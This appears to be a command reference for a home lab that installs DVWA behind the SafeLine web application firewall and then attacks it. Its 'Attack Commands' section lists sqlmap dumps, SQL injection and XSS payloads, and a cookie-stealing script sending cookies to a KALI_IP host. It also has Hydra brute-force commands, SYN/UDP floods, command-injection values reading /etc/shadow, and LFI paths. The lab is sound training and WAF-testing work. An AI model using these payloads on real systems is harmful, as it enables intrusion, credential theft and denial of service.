# 📋 Commands Reference — SafeLine WAF Home Lab

> All commands used in this cybersecurity home lab project, organized by category.

---

## 🖥️ 1. Ubuntu Server Setup

### System Update
```bash
sudo apt update && sudo apt upgrade -y
```

### LAMP Stack Installation
```bash
sudo apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php git wget unzip -y
```

### Start & Enable Services
```bash
# Apache
sudo systemctl start apache2
sudo systemctl enable apache2

# MySQL
sudo systemctl start mysql
sudo systemctl enable mysql
```

### Check Service Status
```bash
sudo systemctl status apache2
sudo systemctl status mysql
```

---

## 📁 2. DVWA Installation

### Download DVWA
```bash
cd /var/www/html
sudo wget https://github.com/digininja/DVWA/archive/refs/heads/master.zip
sudo unzip master.zip
sudo mv DVWA-master DVWA
sudo rm master.zip
```

### Set Permissions
```bash
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 755 /var/www/html/DVWA
```

### Setup Config File
```bash
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
```

### PHP Settings
```bash
# Find php.ini location
sudo find /etc/php -name "php.ini" 2>/dev/null

# Edit php.ini
sudo nano /etc/php/8.5/cli/php.ini
# Change: allow_url_include = On
# Change: allow_url_fopen = On
```

---

## 🗄️ 3. MySQL Database Setup

### Login to MySQL
```bash
sudo mysql -u root
```

### Create Database & User
```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

### Verify Users
```sql
SELECT * FROM users;
```

### Check User Permissions
```sql
SHOW GRANTS FOR 'dvwa'@'localhost';
```

### Test User Login
```bash
mysql -u dvwa -p
# Enter password: p@ssw0rd
```

---

## 🌐 4. Apache Port Configuration

### Edit ports.conf
```bash
sudo nano /etc/apache2/ports.conf
# Change: Listen 80 → Listen 8080
```

### Edit Virtual Host
```bash
sudo nano /etc/apache2/sites-available/000-default.conf
# Change: <VirtualHost *:80> → <VirtualHost *:8080>
```

### Restart Apache
```bash
sudo systemctl restart apache2
```

### Verify Apache Config
```bash
sudo apache2ctl -S
```

---

## 🌍 5. DNS Configuration

### Edit hosts file (Both Machines)
```bash
sudo nano /etc/hosts
# Add: 192.168.100.19    webserver.thesocialdork
```

### Verify hosts file
```bash
cat /etc/hosts
```

### Test DNS Resolution
```bash
ping webserver.thesocialdork
```

---

## 🔒 6. SSL Certificate Generation

### Generate Private Key
```bash
openssl genrsa -out private.key 4096
```

### Generate Certificate Signing Request
```bash
openssl req -new -key private.key -out private.csr
```

### Generate Self-Signed Certificate
```bash
openssl x509 -req -days 365 -in private.csr -signkey private.key -out private.crt
```

### Verify Certificate
```bash
openssl x509 -in private.crt -text -noout
```

---

## 🛡️ 7. SafeLine WAF Installation

### Install SafeLine
```bash
bash -c "$(curl -fsSLk https://waf.chaitin.com/release/latest/manager.sh)" -- --en
```

### Access Dashboard
```
https://192.168.100.19:9443
```

### Check SafeLine Status
```bash
sudo docker ps
```

---

## ⚔️ 8. Attack Commands

### 💉 SQL Injection — SQLmap

#### Basic Database Enumeration
```bash
sqlmap -u "http://webserver.thesocialdork/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<your_session>;security=low" \
--dbs
```

#### List Tables
```bash
sqlmap -u "http://webserver.thesocialdork/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<your_session>;security=low" \
-D dvwa --tables
```

#### Dump Users Table
```bash
sqlmap -u "http://webserver.thesocialdork/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<your_session>;security=low" \
-D dvwa -T users --dump
```

#### Manual SQL Injection Payloads
```
1' OR '1'='1
1' OR 1=1 --
' UNION SELECT user,password FROM users -- -
1' OR '1'='1' #
```

---

### 🖥️ XSS — Cross Site Scripting

#### Basic Alert Payload
```javascript
<script>alert('Hacked!')</script>
```

#### Image Tag Payload (Filter Bypass)
```javascript
<img src=x onerror=alert('XSS')>
```

#### Cookie Stealing Payload
```javascript
<script>document.location='http://KALI_IP/?c='+document.cookie</script>
```

#### Body Tag Payload
```javascript
<body onload=alert('XSS')>
```

#### URL Based XSS
```
http://webserver.thesocialdork/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

---

### 🔐 Brute Force — Hydra

#### Extract Rockyou Wordlist
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

#### Find Wordlist Location
```bash
find /usr/share/wordlists -name "rockyou*" 2>/dev/null
```

#### Hydra Brute Force Command
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
192.168.100.19 http-post-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie:PHPSESSID=<session>;security=low"
```

#### Hydra with Verbose Output
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-V -f 192.168.100.19 http-post-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect"
```

---

### 🌊 HTTP Flood — hping3

#### SYN Flood
```bash
hping3 -S --flood -V -p 80 webserver.thesocialdork
```

#### UDP Flood
```bash
hping3 --udp --flood -p 80 webserver.thesocialdork
```

#### Apache Bench (HTTP Flood)
```bash
ab -n 10000 -c 100 http://webserver.thesocialdork/DVWA/
```

---

### 💻 Command Injection

#### Basic Payloads
```bash
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; uname -a
127.0.0.1 && ls -la
127.0.0.1 | cat /etc/passwd
127.0.0.1; cat /etc/shadow
```

---

### 📂 LFI — Local File Inclusion

#### Basic LFI
```
http://webserver.thesocialdork/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd
```

#### LFI with Encoding
```
http://webserver.thesocialdork/DVWA/vulnerabilities/fi/?page=....//....//....//etc/passwd
```

#### Read Shadow File
```
http://webserver.thesocialdork/DVWA/vulnerabilities/fi/?page=../../../../etc/shadow
```

---

## 🔍 9. Network & Troubleshooting Commands

### Check IP Address
```bash
ip a
```

### Check Open Ports
```bash
sudo netstat -tlnp
sudo ss -tlnp
```

### Test Connectivity
```bash
ping 192.168.100.19
curl http://192.168.100.19/DVWA/
```

### Apache Error Logs
```bash
sudo tail -f /var/log/apache2/error.log
sudo tail -20 /var/log/apache2/error.log
```

### Apache Access Logs
```bash
sudo tail -f /var/log/apache2/access.log
```

### Find Files
```bash
find /var/www/html -name "*.php" 2>/dev/null
find /etc/php -name "php.ini" 2>/dev/null
```

### Check PHP Version
```bash
php -v
```

### Check MySQL Version
```bash
mysql --version
```

---

## 📊 10. Quick Reference — DVWA URLs

| Module | URL |
|--------|-----|
| Setup | `http://192.168.100.19/DVWA/setup.php` |
| Login | `http://192.168.100.19/DVWA/login.php` |
| SQL Injection | `http://192.168.100.19/DVWA/vulnerabilities/sqli/` |
| XSS Reflected | `http://192.168.100.19/DVWA/vulnerabilities/xss_r/` |
| XSS Stored | `http://192.168.100.19/DVWA/vulnerabilities/xss_s/` |
| Brute Force | `http://192.168.100.19/DVWA/vulnerabilities/brute/` |
| Command Injection | `http://192.168.100.19/DVWA/vulnerabilities/exec/` |
| File Inclusion | `http://192.168.100.19/DVWA/vulnerabilities/fi/` |
| CSRF | `http://192.168.100.19/DVWA/vulnerabilities/csrf/` |
| File Upload | `http://192.168.100.19/DVWA/vulnerabilities/upload/` |

---

## 🔑 11. Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| DVWA | admin | password |
| MySQL | root | (none) |
| MySQL DVWA user | dvwa | p@ssw0rd |
| SafeLine Dashboard | (set during install) | (set during install) |

---

> ⚠️ **Note:** Replace `<your_session>` and `<KALI_IP>` with actual values from your lab environment.
> 
> All commands are for educational use in a controlled lab environment only.
